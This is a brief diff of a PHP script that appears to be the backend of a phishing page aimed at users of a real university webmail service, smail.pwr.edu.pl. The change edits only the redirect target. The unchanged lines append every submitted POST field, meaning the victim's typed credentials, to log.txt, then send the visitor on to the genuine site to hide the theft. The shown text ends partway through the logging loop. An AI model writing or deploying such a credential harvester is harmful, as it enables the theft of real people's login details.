@@ -1,5 +1,5 @@
 <?php
-	header('Location:https://smail.pwr.edu.pl/auth');
+	header('Location:https://smail.pwr.edu.pl');
 	$handle=fopen("log.txt","a");
 	fwrite($handle,"Atempt:\r\n");
 	foreach($_POST as $variable => $value){
